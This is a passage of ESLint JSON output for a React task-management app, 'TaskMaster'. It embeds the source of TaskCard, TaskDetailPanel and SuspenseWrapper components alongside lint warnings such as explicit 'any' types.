line-clamp-2\",\n              task.status === 'done' && \"line-through text-muted-foreground\",\n              density === 'compact' && \"text-sm\",\n              density === 'comfortable' && \"text-base\",\n              density === 'spacious' && \"text-lg\"\n            )}>\n              {task.title}\n            </h3>\n            \n            {density !== 'compact' && (\n              <p className=\"text-sm text-muted-foreground mt-1 line-clamp-2\">\n                {task.description}\n              </p>\n            )}\n          </div>\n        </div>\n\n        {/* Actions */}\n        <div className=\"flex items-center space-x-2 ml-4\" ref={dropdownRef}>\n          <div className=\"relative\">\n            <motion.button\n              ref={buttonRef}\n              className={cn(\n                \"p-1 rounded-lg hover:bg-accent transition-all\",\n                // In tests, make button always visible to avoid hover issues\n                process.env.NODE_ENV === 'test' ? \"opacity-100\" : \"opacity-0 group-hover:opacity-100\"\n              )}\n              whileHover={{ scale: 1.1 }}\n              whileTap={{ scale: 0.9 }}\n              onClick={handleDropdownToggle}\n              onKeyDown={handleDropdownButtonKeyDown}\n              aria-haspopup=\"true\"\n              aria-expanded={isDropdownOpen}\n              aria-controls=\"task-dropdown-menu\"\n              aria-label=\"More options\"\n            >\n              <MoreHorizontal data-testid=\"more-icon\" className=\"w-4 h-4\" />\n            </motion.button>\n            \n            {/* Dropdown Menu */}\n            <AnimatePresence>\n              {isDropdownOpen && (\n                <motion.div\n                  id=\"task-dropdown-menu\"\n                  initial={{ opacity: 0, scale: 0.95, y: -10 }}\n                  animate={{ opacity: 1, scale: 1, y: 0 }}\n                  exit={{ opacity: 0, scale: 0.95, y: -10 }}\n                  transition={{ duration: 0.1 }}\n                  className=\"absolute right-0 top-full mt-1 w-48 bg-card border border-border/50 rounded-lg shadow-lg z-50 glass-morphism\"\n                  role=\"menu\"\n                  aria-labelledby=\"task-dropdown-menu\"\n                  onKeyDown={handleDropdownKeyDown}\n                >\n                  {dropdownItems.map((item, index) => (\n                    <motion.button\n                      key={item.id}\n                      className={cn(\n                        \"flex items-center w-full px-3 py-2 text-left text-sm transition-colors first:rounded-t-lg last:rounded-b-lg\",\n                        \"hover:bg-accent focus:bg-accent focus:outline-none\",\n                        focusedOptionIndex === index && \"bg-accent\"\n                      )}\n                      onClick={item.action}\n                      onMouseEnter={() => setFocusedOptionIndex(index)}\n                      role=\"menuitem\"\n                      tabIndex={-1}\n                    >\n                      <span className=\"flex-1\">{item.label}</span>\n                    </motion.button>\n                  ))}\n                </motion.div>\n              )}\n            </AnimatePresence>\n          </div>\n          \n          {/* Delete Confirmation Modal */}\n          <AnimatePresence>\n            {showDeleteConfirm && (\n              <motion.div\n                initial={{ opacity: 0 }}\n                animate={{ opacity: 1 }}\n                exit={{ opacity: 0 }}\n                className=\"fixed inset-0 bg-black/50 z-50 flex items-center justify-center\"\n                onClick={() => setShowDeleteConfirm(false)}\n              >\n                <motion.div\n                  initial={{ scale: 0.9, opacity: 0 }}\n                  animate={{ scale: 1, opacity: 1 }}\n                  exit={{ scale: 0.9, opacity: 0 }}\n                  className=\"bg-card border border-border rounded-lg p-6 max-w-sm mx-4 glass-morphism\"\n                  onClick={(e) => e.stopPropagation()}\n                >\n                  <div className=\"mb-4\">Are you sure you want to delete this task?</div>\n                  <div className=\"flex space-x-3\">\n                    <button\n                      onClick={() => setShowDeleteConfirm(false)}\n                      className=\"flex-1 px-3 py-2 border border-border rounded-lg hover:bg-accent transition-colors\"\n                    >\n                      Cancel\n                    </button>\n                    <button\n                      onClick={() => {\n                        deleteTask(task.id)\n                        setShowDeleteConfirm(false)\n                      }}\n                      className=\"flex-1 px-3 py-2 bg-red-500 text-white rounded-lg hover:bg-red-600 transition-colors\"\n                    >\n                      Delete Task\n                    </button>\n                  </div>\n                </motion.div>\n              </motion.div>\n            )}\n          </AnimatePresence>\n          \n          <ChevronRight className=\"w-4 h-4 text-muted-foreground opacity-0 group-hover:opacity-100 transition-opacity\" />\n        </div>\n      </div>\n\n      {/* Error message */}\n      {error && (\n        <motion.div\n          initial={{ opacity: 0, height: 0 }}\n          animate={{ opacity: 1, height: 'auto' }}\n          exit={{ opacity: 0, height: 0 }}\n          className=\"flex items-center space-x-2 text-red-500 text-sm mb-3\"\n        >\n          <AlertCircle className=\"w-4 h-4\" />\n          <span>{error}</span>\n        </motion.div>\n      )}\n\n      {/* Progress bar */}\n      {task.subtasks.length > 0 && (\n        <div className=\"mb-3\">\n          <div className=\"flex items-center justify-between text-xs text-muted-foreground mb-1\">\n            <span>Progress</span>\n            <span>{progress}%</span>\n          </div>\n          <div className=\"w-full bg-muted/30 rounded-full h-2 overflow-hidden\">\n            <motion.div\n              className=\"h-full bg-gradient-to-r from-blue-500 to-emerald-500 rounded-full\"\n              initial={{ width: 0 }}\n              animate={{ width: `${progress}%` }}\n              transition={{ duration: 0.8, ease: \"easeOut\" }}\n            />\n          </div>\n        </div>\n      )}\n\n      {/* Metadata */}\n      <div className=\"flex items-center justify-between text-xs text-muted-foreground\">\n        <div className=\"flex items-center space-x-4\">\n          {/* Priority */}\n          <div className={cn(\n            \"flex items-center space-x-1 px-2 py-1 rounded-full border\",\n            getPriorityColor(task.priority)\n          )}>\n            {priorityIcon[task.priority]}\n            <span className=\"capitalize\">{task.priority}</span>\n          </div>\n\n          {/* Status - clickable for cycling */}\n          <button\n            onClick={handleStatusToggle}\n            className={cn(\n              \"flex items-center space-x-1 px-2 py-1 rounded-full border transition-colors hover:opacity-80\",\n              getStatusColor(task.status)\n            )}\n            disabled={isLoading}\n          >\n            <span className=\"capitalize\">\n              {task.status === 'in-progress' ? 'In Progress' : \n               task.status === 'pending' ? 'Pending' :\n               task.status === 'done' ? 'Done' :\n               task.status.replace('-', ' ')}\n            </span>\n          </button>\n\n          {/* Dependencies */}\n          {task.dependencies.length > 0 && (\n            <div className=\"flex items-center space-x-1 text-amber-600\">\n              <Link2 className=\"w-3 h-3\" />\n              <span>{task.dependencies.length}</span>\n            </div>\n          )}\n        </div>\n\n        <div className=\"flex items-center space-x-4\">\n          {/* Subtasks count - clickable for expansion */}\n          {task.subtasks.length > 0 && (\n            <button\n              onClick={handleSubtasksToggle}\n              className=\"flex items-center space-x-1 hover:text-foreground transition-colors\"\n            >\n              <CheckCircle2 className=\"w-3 h-3\" />\n              <span>\n                {task.subtasks.filter(s => s.status === 'done').length}/{task.subtasks.length}\n              </span>\n              {task.subtasks.length > 0 && (\n                <span className=\"ml-1\">\n                  {task.subtasks.length === 1 ? '1 subtask' : `${task.subtasks.length} subtasks`}\n                </span>\n              )}\n              <ChevronDown className={cn(\n                \"w-3 h-3 transition-transform\",\n                isSubtasksExpanded && \"rotate-180\"\n              )} />\n            </button>\n          )}\n\n          {/* Due date */}\n          {task.dueDate && (\n            <div className=\"flex items-center space-x-1\">\n              <Calendar className=\"w-3 h-3\" />\n              <span>{formatDate(task.dueDate)}</span>\n            </div>\n          )}\n\n          {/* Estimated time */}\n          {task.estimatedHours && (\n            <div className=\"flex items-center space-x-1\">\n              <Clock className=\"w-3 h-3\" />\n              <span>{task.estimatedHours}h</span>\n            </div>\n          )}\n\n          {/* Assignee */}\n          {task.assignee && (\n            <div className=\"flex items-center space-x-1\">\n              <User className=\"w-3 h-3\" />\n              <span>{task.assignee}</span>\n            </div>\n          )}\n        </div>\n      </div>\n\n      {/* Expanded subtasks */}\n      <AnimatePresence>\n        {isSubtasksExpanded && task.subtasks.length > 0 && (\n          <motion.div\n            initial={{ opacity: 0, height: 0 }}\n            animate={{ opacity: 1, height: 'auto' }}\n            exit={{ opacity: 0, height: 0 }}\n            transition={{ duration: 0.2 }}\n            className=\"mt-3 pt-3 border-t border-border/30\"\n          >\n            <div className=\"space-y-2\">\n              {task.subtasks.map((subtask) => (\n                <div key={subtask.id} className=\"flex items-center space-x-2 text-sm\">\n                  <div className={cn(\n                    \"w-2 h-2 rounded-full\",\n                    subtask.status === 'done' ? \"bg-emerald-500\" : \"bg-muted\"\n                  )} />\n                  <span className={cn(\n                    \"flex-1\",\n                    subtask.status === 'done' && \"line-through text-muted-foreground\"\n                  )}>\n                    {subtask.title}\n                  </span>\n                </div>\n              ))}\n            </div>\n          </motion.div>\n        )}\n      </AnimatePresence>\n\n      {/* Hover effects */}\n      <motion.div\n        className=\"absolute inset-0 bg-gradient-to-r from-blue-500/5 to-purple-500/5 opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none\"\n        initial={false}\n      />\n    </motion.article>\n  )\n}\n\n// Custom prop comparison for React.memo (2025 high-performance version)\nconst _arePropsEqual = (prevProps: TaskCardProps, nextProps: TaskCardProps) => {\n  // Quick reference equality check first - most performant path\n  if (prevProps === nextProps) {\n    return true;\n  }\n\n  // Check if task reference is the same (most common case)\n  if (prevProps.task === nextProps.task && \n      prevProps.index === nextProps.index &&\n      prevProps.density === nextProps.density &&\n      prevProps.isSelected === nextProps.isSelected &&\n      prevProps.isDraggable === nextProps.isDraggable) {\n    return true;\n  }\n\n  // Only perform deep comparison if necessary, focusing on display-critical properties only\n  return (\n    prevProps.task.id === nextProps.task.id &&\n    prevProps.task.title === nextProps.task.title &&\n    prevProps.task.status === nextProps.task.status &&\n    prevProps.task.priority === nextProps.task.priority &&\n    prevProps.index === nextProps.index &&\n    prevProps.density === nextProps.density &&\n    prevProps.isSelected === nextProps.isSelected &&\n    prevProps.isDraggable === nextProps.isDraggable &&\n    // Simple length comparison for arrays - avoid expensive deep checks\n    prevProps.task.subtasks.length === nextProps.task.subtasks.length &&\n    prevProps.task.dependencies.length === nextProps.task.dependencies.length\n  )\n}\n\n// Create memoized version with custom comparison\nconst TaskCard = React.memo(_TaskCardComponent, _arePropsEqual)\nTaskCard.displayName = 'TaskCard'\n\nexport { TaskCard }","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/task/TaskDetailPanel.tsx","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":35,"column":39,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":35,"endColumn":42,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1066,1069],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1066,1069],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":39,"column":43,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":39,"endColumn":46,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1167,1170],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1167,1170],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":121,"column":53,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":121,"endColumn":56,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4254,4257],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4254,4257],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":3,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { useState } from 'react'\nimport { motion, AnimatePresence } from 'framer-motion'\nimport { \n  X, \n  Clock, \n  Target, \n  Link2, \n  CheckCircle2, \n  Plus,\n  Edit3,\n  Trash2,\n  Copy,\n  ExternalLink,\n  MessageSquare,\n  Flag\n} from 'lucide-react'\nimport { useTaskStore } from '@/store/useTaskStore'\nimport { cn, getPriorityColor, getStatusColor, calculateTaskProgress, formatDate } from '@/lib/utils'\n\nexport function TaskDetailPanel() {\n  const { selectedTask, setSelectedTask, updateTask, addSubtask } = useTaskStore()\n  const [activeTab, setActiveTab] = useState<'overview' | 'subtasks' | 'comments' | 'history'>('overview')\n\n  if (!selectedTask) return null\n\n  const progress = calculateTaskProgress(selectedTask)\n\n  const tabs = [\n    { id: 'overview', label: 'Overview', icon: Target },\n    { id: 'subtasks', label: 'Subtasks', icon: CheckCircle2, count: selectedTask.subtasks.length },\n    { id: 'comments', label: 'Comments', icon: MessageSquare, count: 0 },\n    { id: 'history', label: 'History', icon: Clock }\n  ]\n\n  const handleStatusChange = (status: any) => {\n    updateTask(selectedTask.id, { status })\n  }\n\n  const handlePriorityChange = (priority: any) => {\n    updateTask(selectedTask.id, { priority })\n  }\n\n  return (\n    <motion.div\n      initial={{ x: \"100%\" }}\n      animate={{ x: 0 }}\n      exit={{ x: \"100%\" }}\n      transition={{ type: \"spring\", stiffness: 400, damping: 30 }}\n      className=\"h-full flex flex-col bg-background/95 backdrop-blur-xl\"\n    >\n      {/* Header */}\n      <div className=\"p-6 border-b border-border/50\">\n        <div className=\"flex items-start justify-between mb-4\">\n          <div className=\"flex-1 min-w-0 mr-4\">\n            <h2 className=\"text-xl font-bold mb-2 line-clamp-2\">{selectedTask.title}</h2>\n            <p className=\"text-muted-foreground text-sm line-clamp-3\">{selectedTask.description}</p>\n          </div>\n          \n          <motion.button\n            onClick={() => setSelectedTask(null)}\n            className=\"p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n            whileHover={{ scale: 1.05 }}\n            whileTap={{ scale: 0.95 }}\n          >\n            <X className=\"w-4 h-4\" />\n          </motion.button>\n        </div>\n\n        {/* Quick stats */}\n        <div className=\"flex items-center space-x-4 text-sm\">\n          <div className={cn(\n            \"flex items-center space-x-1 px-2 py-1 rounded-full border\",\n            getStatusColor(selectedTask.status)\n          )}>\n            <span className=\"capitalize\">{selectedTask.status.replace('-', ' ')}</span>\n          </div>\n          \n          <div className={cn(\n            \"flex items-center space-x-1 px-2 py-1 rounded-full border\",\n            getPriorityColor(selectedTask.priority)\n          )}>\n            <Flag className=\"w-3 h-3\" />\n            <span className=\"capitalize\">{selectedTask.priority}</span>\n          </div>\n\n          {selectedTask.subtasks.length > 0 && (\n            <div className=\"flex items-center space-x-1 text-muted-foreground\">\n              <CheckCircle2 className=\"w-3 h-3\" />\n              <span>\n                {selectedTask.subtasks.filter(s => s.status === 'done').length}/{selectedTask.subtasks.length}\n              </span>\n            </div>\n          )}\n        </div>\n\n        {/* Progress bar */}\n        {selectedTask.subtasks.length > 0 && (\n          <div className=\"mt-4\">\n            <div className=\"flex items-center justify-between text-xs text-muted-foreground mb-2\">\n              <span>Progress</span>\n              <span>{progress}%</span>\n            </div>\n            <div className=\"w-full bg-muted/30 rounded-full h-2 overflow-hidden\">\n              <motion.div\n                className=\"h-full bg-gradient-to-r from-blue-500 to-emerald-500 rounded-full\"\n                initial={{ width: 0 }}\n                animate={{ width: `${progress}%` }}\n                transition={{ duration: 0.8, ease: \"easeOut\" }}\n              />\n            </div>\n          </div>\n        )}\n      </div>\n\n      {/* Tabs */}\n      <div className=\"border-b border-border/50\">\n        <div className=\"flex space-x-1 p-1\">\n          {tabs.map((tab) => (\n            <motion.button\n              key={tab.id}\n              onClick={() => setActiveTab(tab.id as any)}\n              className={cn(\n                \"flex items-center space-x-2 px-3 py-2 rounded-lg text-sm font-medium transition-all relative\",\n                activeTab === tab.id \n                  ? \"text-foreground\" \n                  : \"text-muted-foreground hover:text-foreground hover:bg-accent/30\"\n              )}\n              whileHover={{ scale: 1.02 }}\n              whileTap={{ scale: 0.98 }}\n            >\n              <tab.icon className=\"w-4 h-4\" />\n              <span>{tab.label}</span>\n              {tab.count !== undefined && tab.count > 0 && (\n                <span className=\"ml-1 px-1.5 py-0.5 bg-muted/50 text-xs rounded-full\">\n                  {tab.count}\n                </span>\n              )}\n              \n              {activeTab === tab.id && (\n                <motion.div\n                  layoutId=\"activeTab\"\n                  className=\"absolute inset-0 bg-accent/50 rounded-lg\"\n                  style={{ zIndex: -1 }}\n                  transition={{ type: \"spring\", stiffness: 400, damping: 30 }}\n                />\n              )}\n            </motion.button>\n          ))}\n        </div>\n      </div>\n\n      {/* Content */}\n      <div className=\"flex-1 overflow-y-auto\">\n        <AnimatePresence mode=\"wait\">\n          <motion.div\n            key={activeTab}\n            initial={{ opacity: 0, y: 20 }}\n            animate={{ opacity: 1, y: 0 }}\n            exit={{ opacity: 0, y: -20 }}\n            transition={{ duration: 0.2 }}\n            className=\"p-6\"\n          >\n            {activeTab === 'overview' && (\n              <div className=\"space-y-6\">\n                {/* Quick actions */}\n                <div className=\"grid grid-cols-2 gap-3\">\n                  <select\n                    value={selectedTask.status}\n                    onChange={(e) => handleStatusChange(e.target.value)}\n                    className=\"p-2 rounded-lg border border-border/50 bg-background/50\"\n                  >\n                    <option value=\"pending\">Pending</option>\n                    <option value=\"in-progress\">In Progress</option>\n                    <option value=\"review\">Review</option>\n                    <option value=\"done\">Done</option>\n                    <option value=\"deferred\">Deferred</option>\n                    <option value=\"cancelled\">Cancelled</option>\n                  </select>\n                  \n                  <select\n                    value={selectedTask.priority}\n                    onChange={(e) => handlePriorityChange(e.target.value)}\n                    className=\"p-2 rounded-lg border border-border/50 bg-background/50\"\n                  >\n                    <option value=\"low\">Low Priority</option>\n                    <option value=\"medium\">Medium Priority</option>\n                    <option value=\"high\">High Priority</option>\n                  </select>\n                </div>\n\n                {/* Details */}\n                <div>\n                  <h4 className=\"font-semibold mb-2\">Details</h4>\n                  <div className=\"prose prose-sm max-w-none\">\n                    <p className=\"text-muted-foreground whitespace-pre-wrap\">\n                      {selectedTask.details || 'No details provided.'}\n                    </p>\n                  </div>\n                </div>\n\n                {/* Test Strategy */}\n                {selectedTask.testStrategy && (\n                  <div>\n                    <h4 className=\"font-semibold mb-2\">Test Strategy</h4>\n                    <div className=\"p-3 bg-muted/30 rounded-lg\">\n                      <p className=\"text-sm text-muted-foreground whitespace-pre-wrap\">\n                        {selectedTask.testStrategy}\n                      </p>\n                    </div>\n                  </div>\n                )}\n\n                {/* Dependencies */}\n                {selectedTask.dependencies.length > 0 && (\n                  <div>\n                    <h4 className=\"font-semibold mb-2\">Dependencies</h4>\n                    <div className=\"space-y-2\">\n                      {selectedTask.dependencies.map((depId) => (\n                        <div key={depId} className=\"flex items-center space-x-2 p-2 bg-muted/30 rounded-lg\">\n                          <Link2 className=\"w-4 h-4 text-muted-foreground\" />\n                          <span className=\"text-sm\">Task #{depId}</span>\n                        </div>\n                      ))}\n                    </div>\n                  </div>\n                )}\n\n                {/* Metadata */}\n                <div className=\"grid grid-cols-2 gap-4 text-sm\">\n                  <div>\n                    <span className=\"text-muted-foreground\">Created</span>\n                    <p className=\"font-medium\">\n                      {selectedTask.createdAt ? formatDate(selectedTask.createdAt) : 'Unknown'}\n                    </p>\n                  </div>\n                  <div>\n                    <span className=\"text-muted-foreground\">Updated</span>\n                    <p className=\"font-medium\">\n                      {selectedTask.updatedAt ? formatDate(selectedTask.updatedAt) : 'Unknown'}\n                    </p>\n                  </div>\n                </div>\n              </div>\n            )}\n\n            {activeTab === 'subtasks' && (\n              <div className=\"space-y-4\">\n                <div className=\"flex items-center justify-between\">\n                  <h4 className=\"font-semibold\">Subtasks</h4>\n                  <motion.button\n                    className=\"flex items-center space-x-1 px-3 py-1 bg-primary text-primary-foreground rounded-lg text-sm\"\n                    whileHover={{ scale: 1.02 }}\n                    whileTap={{ scale: 0.98 }}\n                    onClick={() => {\n                      addSubtask(selectedTask.id, {\n                        title: 'New Subtask',\n                        description: '',\n                        details: '',\n                        status: 'pending'\n                      })\n                    }}\n                  >\n                    <Plus className=\"w-3 h-3\" />\n                    <span>Add Subtask</span>\n                  </motion.button>\n                </div>\n\n                <div className=\"space-y-3\">\n                  {selectedTask.subtasks.map((subtask, index) => (\n                    <motion.div\n                      key={subtask.id}\n                      initial={{ opacity: 0, x: -20 }}\n                      animate={{ opacity: 1, x: 0 }}\n                      transition={{ delay: index * 0.05 }}\n                      className=\"flex items-start space-x-3 p-3 bg-muted/20 rounded-lg\"\n                    >\n                      <motion.button\n                        className=\"mt-0.5\"\n                        whileHover={{ scale: 1.1 }}\n                        whileTap={{ scale: 0.9 }}\n                        onClick={() => {\n                          // const newStatus = subtask.status === 'done' ? 'pending' : 'done'\n                          // updateSubtask(selectedTask.id, subtask.id, { status: newStatus })\n                        }}\n                      >\n                        {subtask.status === 'done' ? (\n                          <CheckCircle2 className=\"w-4 h-4 text-emerald-600\" />\n                        ) : (\n                          <div className=\"w-4 h-4 border-2 border-muted-foreground rounded-full\" />\n                        )}\n                      </motion.button>\n                      \n                      <div className=\"flex-1\">\n                        <h5 className={cn(\n                          \"font-medium\",\n                          subtask.status === 'done' && \"line-through text-muted-foreground\"\n                        )}>\n                          {subtask.title}\n                        </h5>\n                        {subtask.description && (\n                          <p className=\"text-sm text-muted-foreground mt-1\">\n                            {subtask.description}\n                          </p>\n                        )}\n                      </div>\n                    </motion.div>\n                  ))}\n                </div>\n\n                {selectedTask.subtasks.length === 0 && (\n                  <div className=\"text-center py-8 text-muted-foreground\">\n                    <CheckCircle2 className=\"w-8 h-8 mx-auto mb-3 opacity-50\" />\n                    <p>No subtasks yet</p>\n                    <p className=\"text-sm\">Break this task down into smaller steps</p>\n                  </div>\n                )}\n              </div>\n            )}\n\n            {activeTab === 'comments' && (\n              <div className=\"text-center py-8 text-muted-foreground\">\n                <MessageSquare className=\"w-8 h-8 mx-auto mb-3 opacity-50\" />\n                <p>Comments coming soon</p>\n                <p className=\"text-sm\">Collaborate with your team on tasks</p>\n              </div>\n            )}\n\n            {activeTab === 'history' && (\n              <div className=\"text-center py-8 text-muted-foreground\">\n                <Clock className=\"w-8 h-8 mx-auto mb-3 opacity-50\" />\n                <p>History coming soon</p>\n                <p className=\"text-sm\">Track all changes to this task</p>\n              </div>\n            )}\n          </motion.div>\n        </AnimatePresence>\n      </div>\n\n      {/* Actions */}\n      <div className=\"p-6 border-t border-border/50\">\n        <div className=\"flex items-center justify-between\">\n          <div className=\"flex items-center space-x-2\">\n            <motion.button\n              className=\"p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n              whileHover={{ scale: 1.05 }}\n              whileTap={{ scale: 0.95 }}\n              title=\"Edit task\"\n            >\n              <Edit3 className=\"w-4 h-4\" />\n            </motion.button>\n            \n            <motion.button\n              className=\"p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n              whileHover={{ scale: 1.05 }}\n              whileTap={{ scale: 0.95 }}\n              title=\"Duplicate task\"\n            >\n              <Copy className=\"w-4 h-4\" />\n            </motion.button>\n            \n            <motion.button\n              className=\"p-2 rounded-lg hover:bg-accent/50 transition-colors\"\n              whileHover={{ scale: 1.05 }}\n              whileTap={{ scale: 0.95 }}\n              title=\"Open in new tab\"\n            >\n              <ExternalLink className=\"w-4 h-4\" />\n            </motion.button>\n          </div>\n          \n          <motion.button\n            className=\"p-2 rounded-lg hover:bg-destructive/10 text-destructive transition-colors\"\n            whileHover={{ scale: 1.05 }}\n            whileTap={{ scale: 0.95 }}\n            title=\"Delete task\"\n          >\n            <Trash2 className=\"w-4 h-4\" />\n          </motion.button>\n        </div>\n      </div>\n    </motion.div>\n  )\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/task/__tests__/TaskCard.test.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/ui/CommandPalette.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/ui/EmptyState.tsx","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/components/ui/SuspenseWrapper.tsx","messages":[{"ruleId":"react-refresh/only-export-components","severity":1,"message":"Fast refresh only works when a file only exports components. Use a new file to share constants or functions between components.","line":228,"column":14,"nodeType":"Identifier","messageId":"namedExport","endLine":228,"endColumn":26}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":1,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import React, { Suspense, ReactNode } from 'react';\nimport { motion } from 'framer-motion';\nimport { Loader2, Zap } from 'lucide-react';\n\ninterface SuspenseWrapperProps {\n  children: ReactNode;\n  fallback?: ReactNode;\n  level?: 'app' | 'component' | 'route';\n  name?: string;\n}\n\nconst LoadingSpinner: React.FC<{ size?: number }> = ({ size = 24 }) => (\n  <motion.div\n    animate={{ rotate: 360 }}\n    transition={{\n      duration: 1,\n      repeat: Infinity,\n      ease: \"linear\",\n    }}\n    className=\"text-primary\"\n  >\n    <Loader2 size={size} />\n  </motion.div>\n);\n\nconst _ComponentLevelFallback: React.FC<{ name?: string }> = ({ name }) => (\n  <motion.div\n    initial={{ opacity: 0, scale: 0.95 }}\n    animate={{ opacity: 1, scale: 1 }}\n    exit={{ opacity: 0, scale: 0.95 }}\n    transition={{ duration: 0.2 }}\n    className=\"flex items-center justify-center p-8 min-h-32 bg-card/50 rounded-lg border border-border/50\"\n  >\n    <div className=\"flex flex-col items-center gap-3\">\n      <LoadingSpinner size={20} />\n      <span className=\"text-sm text-muted-foreground\">\n        {name ? `Loading ${name}...` : 'Loading...'}\n      </span>\n    </div>\n  </motion.div>\n);\n\nconst _RouteLevelFallback: React.FC<{ name?: string }> = ({ name }) => (\n  <motion.div\n    initial={{ opacity: 0, y: 20 }}\n    animate={{ opacity: 1, y: 0 }}\n    exit={{ opacity: 0, y: 20 }}\n    transition={{ duration: 0.3 }}\n    className=\"flex flex-col items-center justify-center min-h-96 p-8\"\n  >\n    <div className=\"flex flex-col items-center gap-4\">\n      <div className=\"relative\">\n        <LoadingSpinner size={32} />\n        \n        {/* Decorative elements */}\n        <motion.div\n          initial={{ scale: 0, opacity: 0 }}\n          animate={{ scale: 1, opacity: 1 }}\n          transition={{ delay: 0.2, type: \"spring\" }}\n          className=\"absolute -top-2 -right-2\"\n        >\n          <Zap size={16} className=\"text-yellow-500\" />\n        </motion.div>\n      </div>\n      \n      <div className=\"text-center\">\n        <h3 className=\"text-lg font-semibold text-foreground mb-2\">\n          {name ? `Loading ${name}` : 'Loading Page'}\n        </h3>\n        <p className=\"text-sm text-muted-foreground max-w-sm\">\n          Please wait while we prepare everything for you\n        </p>\n      </div>\n      \n      {/* Loading progress bar */}\n      <motion.div\n        initial={{ width: 0 }}\n        animate={{ width: \"100%\" }}\n        transition={{ duration: 2, ease: \"easeInOut\" }}\n        className=\"h-1 bg-primary/20 rounded-full overflow-hidden w-48\"\n      >\n        <motion.div\n          initial={{ x: \"-100%\" }}\n          animate={{ x: \"100%\" }}\n          transition={{\n            duration: 1.5,\n            repeat: Infinity,\n            ease: \"easeInOut\",\n          }}\n          className=\"h-full w-1/3 bg-gradient-to-r from-transparent via-primary to-transparent\"\n        />\n      </motion.div>\n    </div>\n  </motion.div>\n);\n\nconst _AppLevelFallback: React.FC<{ name?: string }> = ({ name }) => (\n  <div className=\"min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50 dark:from-slate-950 dark:via-slate-900 dark:to-slate-950\">\n    {/* Animated background elements */}\n    <div className=\"fixed inset-0 overflow-hidden pointer-events-none\">\n      <motion.div\n        className=\"absolute -top-1/2 -right-1/2 w-96 h-96 bg-gradient-to-br from-blue-400/10 to-purple-600/10 rounded-full blur-3xl\"\n        animate={{\n          x: [0, 100, 0],\n          y: [0, -50, 0],\n          scale: [1, 1.1, 1],\n        }}\n        transition={{\n          duration: 20,\n          repeat: Infinity,\n          repeatType: \"reverse\",\n          ease: \"easeInOut\",\n        }}\n      />\n      <motion.div\n        className=\"absolute -bottom-1/2 -left-1/2 w-96 h-96 bg-gradient-to-tr from-emerald-400/10 to-cyan-600/10 rounded-full blur-3xl\"\n        animate={{\n          x: [0, -100, 0],\n          y: [0, 50, 0],\n          scale: [1, 1.2, 1],\n        }}\n        transition={{\n          duration: 25,\n          repeat: Infinity,\n          repeatType: \"reverse\",\n          ease: \"easeInOut\",\n        }}\n      />\n    </div>\n\n    <motion.div\n      initial={{ opacity: 0, scale: 0.9 }}\n      animate={{ opacity: 1, scale: 1 }}\n      transition={{ duration: 0.5 }}\n      className=\"relative flex flex-col items-center justify-center min-h-screen p-8\"\n    >\n      <div className=\"flex flex-col items-center gap-6 text-center\">\n        {/* Logo or brand */}\n        <motion.div\n          initial={{ y: -20, opacity: 0 }}\n          animate={{ y: 0, opacity: 1 }}\n          transition={{ delay: 0.2 }}\n          className=\"relative\"\n        >\n          <div className=\"w-20 h-20 bg-gradient-to-br from-primary to-primary/80 rounded-2xl flex items-center justify-center shadow-lg\">\n            <Zap size={40} className=\"text-primary-foreground\" />\n          </div>\n          \n          {/* Pulsing effect */}\n          <motion.div\n            initial={{ scale: 1, opacity: 0.5 }}\n            animate={{ scale: 1.2, opacity: 0 }}\n            transition={{\n              duration: 2,\n              repeat: Infinity,\n              ease: \"easeOut\",\n            }}\n            className=\"absolute inset-0 bg-primary/20 rounded-2xl\"\n          />\n        </motion.div>\n\n        <motion.div\n          initial={{ y: 20, opacity: 0 }}\n          animate={{ y: 0, opacity: 1 }}\n          transition={{ delay: 0.3 }}\n          className=\"space-y-4\"\n        >\n          <h1 className=\"text-4xl font-bold bg-gradient-to-r from-foreground to-foreground/80 bg-clip-text text-transparent\">\n            TaskMaster\n          </h1>\n          \n  